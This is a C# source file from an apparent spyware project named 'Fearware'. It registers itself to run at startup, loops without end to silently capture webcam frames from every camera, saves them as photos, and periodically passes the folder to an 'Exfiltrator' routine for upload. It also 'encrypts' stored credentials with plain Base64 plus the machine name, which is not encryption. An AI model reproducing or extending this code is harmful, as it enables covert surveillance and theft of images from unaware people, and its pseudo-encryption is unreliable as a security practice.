using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Media;
using System.Windows;
using Windows.Media.Capture;
using Windows.Storage;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading;
using Microsoft.Win32;
using static System.Environment;
using IWshRuntimeLibrary;
using System.Configuration;
using System.Security.Cryptography;
using Newtonsoft.Json;

namespace Fearware
{
    public class Core
    {
        private string _userName;
        private static Dictionary<string, object> _jsonFile;
        private string _localPath;
        private string _imagesPath;
        private int _photoNumber = 0;
        private int _fInfoIndex = 0;
        private FilterInfoCollection _filterInfoCollection;
        private VideoCaptureDevice _videoCaptureDevice;

        public Core()
        {
            _userName = Environment.UserName;
            _localPath = Environment.CurrentDirectory;
            _jsonFile = LoadJson(_localPath+@"\credentials.json");
            if ((bool)_jsonFile["encrypted"] == false)
            {
                try
                {
                    object user;
                    object pass;
                    _jsonFile.TryGetValue("username", out user);
                    _jsonFile.TryGetValue("password", out pass);
                    _jsonFile["username"] = Base64Encode((string)user, Environment.MachineName);
                    _jsonFile["password"] = Base64Encode((string)pass, Environment.MachineName);
                    _jsonFile["encrypted"] = true;
                    System.IO.File.WriteAllText(_localPath+@"\credentials.json", JsonConvert.SerializeObject(_jsonFile));
                }
                catch { }

            }
            _imagesPath = FWUtility.CreateFolder(_localPath + "\\photos");
            FWUtility.SetStartup();
            StartExecute();

        }
        
        public static Dictionary<string,object> GetCredJson()
        {
            return _jsonFile;
        }
        
        public static string Base64Encode(string plainText, string salt)
        {

            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText + salt);
            return System.Convert.ToBase64String(plainTextBytes);
        }
        public static string Base64Decode(string base64EncodedData, string salt)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes).Substring(0, System.Text.Encoding.UTF8.GetString(base64EncodedBytes).Length - salt.Length);
        }

        public Dictionary<string, object> LoadJson(string filename)
        {
            Dictionary<string, object> items;
            using (StreamReader r = new StreamReader(filename))
            {
                string json = r.ReadToEnd();
                items = JsonConvert.DeserializeObject<Dictionary<string, object>>(json);
            }
            return items;
        }


        private void SetUploadOnDB(string imagesPath)
        {
            Exfiltrator.Start(imagesPath);
        }



        private void StartExecute()
        {
            int count = 0;
            while (true)
            {
                if (count < 15)
                {
                    _filterInfoCollection = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                    if (FormStart.isActive)
                    {
                        for (_fInfoIndex = 0; _fInfoIndex < _filterInfoCollection.Count; _fInfoIndex++)
                        {
                            _videoCaptureDevice = new VideoCaptureDevice(_filterInfoCollection[_fInfoIndex].MonikerString);
                            _videoCaptureDevice.Start();
                            _videoCaptureDevice.NewFrame += CaptureFrame;
                            _videoCaptureDevice.WaitForStop();
                            _photoNumber++;
                        }
                    }
                }
                else
                {
                    if (Directory.GetFiles(_imagesPath).Length != 0)
                    {
                        SetUploadOnDB(_imagesPath);
                    }
                    count = -1;
                }
                Thread.Sleep(10000);
                count++;
            }

        }



        private void CaptureFrame(object sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                FWUtility.CreateFolder(_imagesPath);
                eventArgs.Frame.Save(_imagesPath + "\\" + _photoNumber + "_" + DateTime.Now.Date.ToShortDateString().Replace("/", "-") + ".jpg", ImageFormat.Jpeg);
                eventArgs.Frame.Dispose();
            }
            catch
            {

            }
            _videoCaptureDevice.SignalToStop();

        }
    }
}
